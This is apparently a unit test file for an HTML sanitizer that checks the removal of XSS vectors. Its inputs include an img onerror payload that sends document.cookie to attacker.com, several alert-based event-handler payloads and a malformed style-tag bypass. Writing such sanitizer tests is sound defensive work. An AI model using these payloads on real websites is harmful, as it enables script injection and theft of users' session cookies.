import { expect } from 'chai';

import { sanitizeHTML, sanitizeHtmlInObject } from './sanitizer.service';

describe('HTML Sanitizer - XSS Prevention', () => {
  describe('sanitizeHTML', () => {
    it('should strip onerror attribute from img tags', () => {
      const maliciousHtml = '<img src="x" onerror="fetch(\'https://attacker.com?d=\'+document.cookie);" />';
      const sanitized = sanitizeHTML(maliciousHtml);

      expect(sanitized).to.not.include('onerror');
      expect(sanitized).to.not.include('fetch');
      expect(sanitized).to.include('<img');
      expect(sanitized).to.include('src="x"');
    });

    it('should strip onload attribute from img tags', () => {
      const maliciousHtml = '<img src="valid.jpg" onload="alert(\'XSS\')" />';
      const sanitized = sanitizeHTML(maliciousHtml);

      expect(sanitized).to.not.include('onload');
      expect(sanitized).to.not.include('alert');
      expect(sanitized).to.include('<img');
      expect(sanitized).to.include('src="valid.jpg"');
    });

    it('should strip onclick attribute from img tags', () => {
      const maliciousHtml = '<img src="x" onclick="alert(\'XSS\')" />';
      const sanitized = sanitizeHTML(maliciousHtml);

      expect(sanitized).to.not.include('onclick');
      expect(sanitized).to.not.include('alert');
      expect(sanitized).to.include('<img');
      expect(sanitized).to.include('src="x"');
    });

    it('should strip onmouseover attribute from img tags', () => {
      const maliciousHtml = '<img src="x" onmouseover="alert(\'XSS\')" />';
      const sanitized = sanitizeHTML(maliciousHtml);

      expect(sanitized).to.not.include('onmouseover');
      expect(sanitized).to.not.include('alert');
      expect(sanitized).to.include('<img');
    });

    it('should allow safe img attributes', () => {
      const safeHtml = '<img src="image.jpg" alt="Description" width="100" height="100" />';
      const sanitized = sanitizeHTML(safeHtml);

      expect(sanitized).to.include('src="image.jpg"');
      expect(sanitized).to.include('alt="Description"');
      expect(sanitized).to.include('width="100"');
      expect(sanitized).to.include('height="100"');
    });

    it('should allow style attributes', () => {
      const htmlWithStyle = '<div style="color: red;">Styled content</div>';
      const sanitized = sanitizeHTML(htmlWithStyle);

      expect(sanitized).to.include('style="color: red;"');
      expect(sanitized).to.include('Styled content');
    });

    it('should allow class and id attributes', () => {
      const htmlWithClasses = '<div class="container" id="main">Content</div>';
      const sanitized = sanitizeHTML(htmlWithClasses);

      expect(sanitized).to.include('class="container"');
      expect(sanitized).to.include('id="main"');
    });

    it('should strip oncontentvisibilityautostatechange attribute', () => {
      const maliciousHtml =
        '<a oncontentvisibilityautostatechange="alert(window.origin)" style="display:block;content-visibility:auto">click</a>';
      const sanitized = sanitizeHTML(maliciousHtml);

      expect(sanitized).to.not.include('oncontentvisibilityautostatechange');
      expect(sanitized).to.not.include('alert');
      expect(sanitized).to.include('<a');
      expect(sanitized).to.include('style="display:block;content-visibility:auto"');
    });

    it('should strip any attribute starting with "on" as event handlers', () => {
      const maliciousHtml = '<div onfutureevent="alert(1)" data-value="safe">Content</div>';
      const sanitized = sanitizeHTML(maliciousHtml);

      expect(sanitized).to.not.include('onfutureevent');
      expect(sanitized).to.not.include('alert');
      expect(sanitized).to.include('data-value="safe"');
      expect(sanitized).to.include('Content');
    });

    it('should remove script tags', () => {
      const maliciousHtml = '<div>Safe content</div><script>alert("XSS")</script>';
      const sanitized = sanitizeHTML(maliciousHtml);

      expect(sanitized).to.not.include('<script>');
      expect(sanitized).to.not.include('alert');
      expect(sanitized).to.include('<div>Safe content</div>');
    });

    it('should preserve DOCTYPE', () => {
      const htmlWithDoctype = '<!DOCTYPE html><html><body>Content</body></html>';
      const sanitized = sanitizeHTML(htmlWithDoctype);

      expect(sanitized).to.include('<!DOCTYPE html>');
    });

    it('should handle empty or null input', () => {
      expect(sanitizeHTML('')).to.equal('');
      expect(sanitizeHTML(null as any)).to.equal(null);
      expect(sanitizeHTML(undefined as any)).to.equal(undefined);
    });

    it('should prevent XSS via malformed style closing tag </style/>', () => {
      const maliciousHtml = '<style></style/><img src onerror=alert(origin)></style>';
      const sanitized = sanitizeHTML(maliciousHtml);

      expect(sanitized).to.not.include('onerror');
      expect(sanitized).to.not.include('alert');
    });

    it('should preserve legitimate style tags', () => {
      const safeHtml = '<style>body { color: red; }</style>';
      const sanitized = sanitizeHTML(safeHtml);

      expect(sanitized).to.include('<style>');
      expect(sanitized).to.include('body { color: red; }');
      expect(sanitized).to.include('</style>');
    });
  });

  describe('sanitizeHtmlInObject', () => {
    it('should sanitize string values in object', () => {
      const obj = {
        content: '<img src="x" onerror="alert(\'XSS\')" />',
        title: 'Safe title',
      };

      const sanitized = sanitizeHtmlInObject(obj);

      expect(sanitized.content).to.not.include('onerror');
      expect(sanitized.content).to.not.include('alert');
      expect(sanitized.content).to.include('<img');
      expect(sanitized.title).to.equal('Safe title');
    });

    it('should sanitize nested objects with img XSS', () => {
      const obj = {
        nested: {
          content: '<img src="x" onerror="alert(\'XSS\')" />',
        },
      };

      const sanitized = sanitizeHtmlInObject(obj);

      expect(sanitized.nested.content).to.not.include('onerror');
      expect(sanitized.nested.content).to.include('<img');
    });

    it('should sanitize arrays', () => {
      const obj = {
        items: ['<img src="x" onerror="alert(1)" />', 'Safe string'],
      };

      const sanitized = sanitizeHtmlInObject(obj);

      expect(sanitized.items[0]).to.not.include('onerror');
      expect(sanitized.items[1]).to.equal('Safe string');
    });

    it('should preserve non-string values', () => {
      const obj = {
        number: 123,
        boolean: true,
        nullValue: null,
      };

      const sanitized = sanitizeHtmlInObject(obj);

      expect(sanitized.number).to.equal(123);
      expect(sanitized.boolean).to.equal(true);
      expect(sanitized.nullValue).to.equal(null);
    });
  });
});
